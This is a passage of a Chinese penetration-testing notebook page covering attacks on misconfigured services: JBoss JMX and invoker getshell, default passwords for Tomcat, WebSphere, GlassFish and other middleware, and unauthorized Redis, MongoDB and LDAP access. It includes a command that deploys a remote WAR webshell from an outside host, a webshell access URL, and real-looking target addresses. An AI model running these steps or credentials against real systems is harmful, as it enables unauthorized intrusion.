+Archives），用于压缩、发布、部署和封装库、组件、程序插件。</p>
+
+<p>WAR（Web
+ARchives），JAR文件包含一个Web应用程序的组件。</p>
+
+<h2 id="242-漏洞利用">24.2 漏洞利用</h2>
+
+<ul>
+  <li>WAR文件</li>
+</ul>
+
+<p>在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK
+jar命令创建。</p>
+
+<ul>
+  <li>JMX Console</li>
+</ul>
+
+<p>web-console</p>
+
+<p>jmx-console</p>
+
+<p>invoker/JMXInvokerServlet</p>
+
+<p>JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。</p>
+
+<p>JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。</p>
+
+<p>Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p>
+
+<p>War包的部署，执行shell命令。</p>
+
+<ul>
+  <li>Jboss弱口令</li>
+</ul>
+
+<p>http://IP/admin-console admin / admin</p>
+
+<h2 id="243-实例应用">24.3 实例应用</h2>
+
+<p>http://yy.yy.yy.yy:8080/web-console/ 未授权访问</p>
+
+<p><img src="\assets\img\安全运维\file_html_8e55e3f044ed0364.png" alt="" /></p>
+
+<p>先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。</p>
+
+<p><img src="\assets\img\安全运维\file_html_90d6709742b78542.png" alt="" /></p>
+
+<h3 id="1-admin-console-getshell">&lt;1&gt; admin-console getshell</h3>
+
+<p><a href="http://yy.yy.yy.yy/admin-console/">http://yy.yy.yy.yy/admin-console/</a> 无效</p>
+
+<p><img src="\assets\img\安全运维\file_html_28bdb02a0cb5a373.png" alt="" /></p>
+
+<h3 id="2-jmx-console-getshell">&lt;2&gt; jmx-console getshell</h3>
+
+<p><a href="http://yy.yy.yy.yy/jmx-console/">http://yy.yy.yy.yy/jmx-console/</a> 存在</p>
+
+<p>需要将war包或jsp shell放到服务器上
+<a href="http://p2j.cn/is.war">http://p2j.cn/is.war</a></p>
+
+<p>jboss.deployment——&gt;void addURL</p>
+
+<p><img src="\assets\img\安全运维\file_html_d6a528da8f01270e.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_fa352df195521efa.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_5acfb48291d0131b.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_b4b2160d26750158.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_cc69a4e856862c50.png" alt="" /></p>
+
+<p>上传成功，但是文件访问不存在</p>
+
+<p><img src="\assets\img\安全运维\file_html_6201bba2e6c4598.png" alt="" /></p>
+
+<h3 id="3-web-console-getshell">&lt;3&gt; web-console getshell</h3>
+
+<p><a href="http://xx.xx.xx.xx/web-console/">http://xx.xx.xx.xx/web-console/</a> 存在</p>
+
+<p><img src="\assets\img\安全运维\file_html_15bb592501eaeab4.png" alt="" /></p>
+
+<h3 id="41-invoker-getshell">&lt;41&gt; invoker getshell</h3>
+
+<p>inovker接口未配置认证信息</p>
+
+<p>yy.yy.yy.yy/invoker/JMXInvokerServlet</p>
+
+<p><img src="\assets\img\安全运维\file_html_51cd584709c21a49.png" alt="" /></p>
+
+<p>案例<a href="http://www.wooyun.org/bugs/wooyun-2010-0121861">http://www.wooyun.org/bugs/wooyun-2010-0121861</a>中使用curl命令：</p>
+
+<p>curl <a href="http://www.wooyun.org/bugs/wooyun-2010-0121861">http://www.wooyun.org/bugs/wooyun-2010-0121861</a></p>
+
+<p><img src="\assets\img\安全运维\file_html_ce74e6ffdf131681.png" alt="" /></p>
+
+<p>查看系统名称：</p>
+
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i
+http://yy.yy.yy.yy/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSName</p>
+
+<p>Windows 2003</p>
+
+<p><img src="\assets\img\安全运维\file_html_228e2132d6117e7e.png" alt="" /></p>
+
+<p>查看系统版本</p>
+
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i
+http://yy.yy.yy.yy/invoker/JMXInvokerServlet get jboss.system:type=ServerInfo OSVersion</p>
+
+<p><img src="\assets\img\安全运维\file_html_520647a32422e3a2.png" alt="" /></p>
+
+<p>远程部署war包（失败）</p>
+
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i
+http://yy.yy.yy.yy/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy
+http://p2j.cn/is.war</p>
+
+<p><img src="\assets\img\安全运维\file_html_f6f6157ae371b472.png" alt="" /></p>
+
+<p><a href="http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&amp;cmd=ls">http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;cmd=ls</a>
+访问shell是失败</p>
+
+<p><img src="\assets\img\安全运维\file_html_9f1eec4d60316f17.png" alt="" /></p>
+
+<h1 id="25-测试机外网可访问">25 测试机外网可访问</h1>
+
+<p>测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..
+此部分不好做归纳，故略过。</p>
+
+<h1 id="26-padding-oracle-attack">26 padding oracle attack</h1>
+
+<h2 id="261-基础知识">26.1 基础知识</h2>
+
+<p>Padding指数据“填充”</p>
+
+<p>对于<a href="http://baike.baidu.com/view/155969.htm">加密算法</a>来说，它们是基于等长的“<a href="http://baike.baidu.com/view/702806.htm">数据块</a>”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS
+#5规则，简单地说，便是根据最后一个数据块(http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。</p>
+
+<h2 id="262-漏洞利用">26.2 漏洞利用</h2>
+
+<p>略过，乌云上有案例。</p>
+
+<h1 id="27-tomcat弱口令">27 tomcat弱口令</h1>
+
+<h2 id="271-基础知识">27.1 基础知识</h2>
+
+<p>不再提及。</p>
+
+<h2 id="272-漏洞利用">27.2 漏洞利用</h2>
+
+<p>弱密码：</p>
+
+<p><a href="http://www.xxxx.com:8080/manager/html">http://www.xxxx.com:8080/manager/html</a> tomcat:tomcat</p>
+
+<p><a href="http://www.xxxx.com:8080/manager/html">http://www.xxxx.com:8080/manager/html</a> admin:admin</p>
+
+<h1 id="28-phpmyadmin弱口令">28 phpmyadmin弱口令</h1>
+
+<p>略</p>
+
+<h1 id="29-mongodb配置不当">29 MongoDB配置不当</h1>
+
+<p>drops.wooyun.org/papers/850</p>
+
+<h2 id="291-基本介绍">29.1 基本介绍</h2>
+
+<p>略</p>
+
+<h2 id="292-未授权访问">29.2 未授权访问</h2>
+
+<p>默认数据库 admin</p>
+
+<p>用户密码和密码均为空</p>
+
+<p><img src="\assets\img\安全运维\file_html_af31540eed427f60.png" alt="" /></p>
+
+<h2 id="293-实战演练">29.3 实战演练</h2>
+
+<p>yy.yy.yy.yy:27017
+博苑家_幼儿园教育信息化平台</p>
+
+<p><img src="\assets\img\安全运维\file_html_933d6e56d127adb.png" alt="" /></p>
+
+<h1 id="30-各种敏感后台对外开放">30 各种敏感后台对外开放</h1>
+
+<p>一般“奇葩”端口web访问可见。</p>
+
+<h1 id="31-django配置不当致信息泄露">31 Django配置不当致信息泄露</h1>
+
+<p>Django设置debug = True
+，将报错信息返回至浏览页面，从而导致信息泄露</p>
+
+<h1 id="32-redis未授权访问">32 Redis未授权访问</h1>
+
+<p>Port: 6379</p>
+
+<p>一般不需要认证，可直接访问</p>
+
+<h2 id="321-基础知识">32.1 基础知识</h2>
+
+<p>Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。</p>
+
+<p>和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。</p>
+
+<p>其中RDB就像数据库备份文件</p>
+
+<p>AOF则是一个log日志文件</p>
+
+<h2 id="322-利用方式">32.2 利用方式</h2>
+
+<ul>
+  <li>Kali下：</li>
+</ul>
+
+<p>redis-cli -h xx.com</p>
+
+<ul>
+  <li>
+    <p>使用软件： Redis Desktop Manager</p>
+  </li>
+  <li>
+    <p>利用redis未授权访问漏洞getshell【www.secpulse.com/archives/5357.html】</p>
+
+    <ul>
+      <li>
+        <p>开启web服务</p>
+      </li>
+      <li>
+        <p>网站物理路径</p>
+      </li>
+      <li>
+        <p>www目录可写（root权限）</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="323-实战演练">32.3 实战演练</h2>
+
+<p>xx科技有限公司</p>
+
+<p><img src="\assets\img\安全运维\file_html_83a0c3790ea4b0cf.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_f0a10558018436fa.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_29c9a47e91a7ef0a.png" alt="" /></p>
+
+<h1 id="33-ldap未授权访问">33 LDAP未授权访问</h1>
+
+<p>Port: 389
+WooYun-2015-92789(http://www.wooyun.org/bugs/wooyun-2015-092789)</p>
+
+<h2 id="331-基础知识">33.1 基础知识</h2>
+
+<p>Lightweight Directory Access
+Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p>
+
+<h2 id="332-利用方式">33.2 利用方式</h2>
+
+<p>使用LDAP Admin进行登陆</p>
+
+<h2 id="333-应用实例">33.3 应用实例</h2>
+
+<p>zz.zz.zz.zz</p>
+
+<p><img src="\assets\img\安全运维\file_html_63de4b8b96d21dcd.png" alt="" /></p>
+
+<h1 id="34-smb弱口令">34 SMB弱口令</h1>
+
+<p>Port: 445</p>
+
+<h2 id="341-smb字典">34.1 smb字典</h2>
+
+<h2 id="342-ms08-067溢出">34.2 MS08-067溢出</h2>
+
+<p>http://www.2cto.com/Article/201308/237265.html</p>
+
+<p>Windows Server
+服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft
+Windows 2000 、Windows XP 、Windows
+Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。</p>
+
+<p>Nmap 可以检测目标上是否存在该漏洞：</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>namp –sS –A –script=smb-check-vulns –PO zz.zz.zz.zz
+
+nmap -sS -A --script=smb-check-vulns -PO zz.zz.zz.zz
+</code></pre>
+</div>
+<p>…….</p>
+
+<h1 id="35-openssl心脏出血">35 openssl心脏出血</h1>
+
+<p>Port：443</p>
+
+<p>Kali桌面以保存python验证脚本</p>
+
+<p>root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz</p>
+
+<h1 id="36-squid代理默认端口">36 squid代理默认端口</h1>
+
+<p>Port: 3128</p>
+
+<p>若没有设置口令，则很可能直接漫游内网。</p>
+
+<h1 id="37-glassfish-web中间件弱口令">37 GlassFish web中间件弱口令</h1>
+
+<p>Port: 4848</p>
+
+<p>弱口令：admin / adminadmin</p>
+
+<h1 id="38-php-fastcgi远程利用">38 PHP FastCGI远程利用</h1>
+
+<p>Port：9000</p>
+
+<p>zone.wooyun.org/content/1060</p>
+
+<p>使用nmap进行指纹识别： <code class="highlighter-rouge">nmap –sV –p 9000
+–open zz.zz.zz.zz/24</code></p>
+
+<p>目前遇到poc执行出现问题：invalid header
+version</p>
+
+<p>（windows 7下未安装goland，
+kali中已安装仍然出现该问题）</p>
+
+<h1 id="39-elasticsearch代码执行">39 elasticsearch代码执行</h1>
+
+<p>Port: 9200</p>
+
+<h1 id="40-websphere-web中间件弱口令">40 websphere web中间件弱口令</h1>
+
+<p>Port: 9043</p>
+
+<p>弱口令：</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>admin / admin
+
+websphere / websphere
+
+system / manager
+</code></pre>
+</div>
+
+<h1 id="41-zebra路由弱密码">41 zebra路由弱密码</h1>
+
+<p>Port: 2601,2604</p>
+
+<p>zebra / zebra</p>
+
+<h1 id="42-rundeck-web">42 rundeck web</h1>
+
+<p>Port：4440 wooyun-2015-092026</p>
+
+<p>runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。</p>
+
+<p>http://IP:4440 admin / admin</p>
+
+<p>http://IP:4440/menu/home</p>
+
+<h1 id="43-dns未设置spf导致邮箱欺骗漏洞">43 dns未设置spf导致邮箱欺骗漏洞</h1>
+
+<p>nslookup –qt=mx baidu.com</p>
+
+<p>nslookup –qt=txt baidu.com</p>
+
+<h1 id="44-cvs源码泄露">44 CVS源码泄露</h1>
+
+<h2 id="441-基础知识">44.1 基础知识</h2>
+
+<p>略</p>
+
+<h2 id="442-实例应用">44.2 实例应用</h2>
+
+<p>zz集团</p>
+
+<p><a href="http://61.152.242.65/bs3q/CVS/Root">http://yy.yy.yy.yy/bs3q/CVS/Root</a></p>
+
+<p><a href="http://61.152.242.65/cmbs/CVS/Root">http://yy.yy.yy.yy/cmbs/CVS/Root</a></p>
+
+<p><img src="\assets\img\安全运维\file_html_9f3274155b1132f6.png" alt="" /></p>
+
+<p><a href="http://61.152.242.65/cmbs/CVS/Entries">http://yy.yy.yy.yy/cmbs/CVS/Entries</a></p>
+
+<p><img src="\assets\img\安全运维\file_html_41469a6a25a8a31a.png" alt="" /></p>
+
+<h1 id="45-tomcat-examples-directory漏洞">45 Tomcat examples directory漏洞</h1>
+
+<p><a href="http://61.152.242.65/examples/servlets/servlet/SessionExample">http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample</a></p>
+
+<p><img src="\assets\img\安全运维\file_html_3a3e383932a1596a.png" alt="" /></p>
+
+<p>是否存在sql post注入
+、session伪造等安全问题。</p>
+
+
+    </div>
+    
+
+	
+	<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+	
+
+
+	<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://pa55w0rd.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<script id="dsq-count-scr" src="//pa55w0rd.disqus.com/count.js" async></script>
+
+
+  </div>
+  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<!--
+<script language=JavaScript>
+
+var caution = false
+function setCookie(name, value, expires, path, domain, secure) {
+var curCookie = name + "=" + escape(value) +
+((expires) ? "; expires=" + expires.toGMTString() : "") +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+((secure) ? "; secure" : "")
+if (!caution || (name + "=" + escape(value)).length <= 4000)
+document.cookie = curCookie
+else
+if (confirm("Cookie exceeds 4KB and will be cut!"))
+document.cookie = curCookie
+}
+function getCookie(name) {
+var prefix = name + "="
+var cookieStartIndex = document.cookie.indexOf(prefix)
+if (cookieStartIndex == -1)
+return null
+var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
+if (cookieEndIndex == -1)
+cookieEndIndex = document.cookie.length
+return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
+}
+function deleteCookie(name, path, domain) {
+if (getCookie(name)) {
+document.cookie = name + "=" +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+"; expires=Thu, 01-Jan-70 00:00:01 GMT"
+}
+}
+function fixDate(date) {
+var base = new Date(0)
+var skew = base.getTime()
+if (skew > 0)
+date.setTime(date.getTime() - skew)
+}
+var now = new Date()
+fixDate(now)
+now.setTime(now.getTime() + 365 * 24 * 60 * 60 * 1000)
+var visits = getCookie("counter")
+if (!visits)
+visits = 1
+else
+visits = parseInt(visits) + 1
+setCookie("counter", visits, now)
+document.write("您是第" + visits + "位访问本篇文章的！")
+
+</script>
+-->
+
+</article>
+
+    </div>
+  </main>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+</body>
+</html>
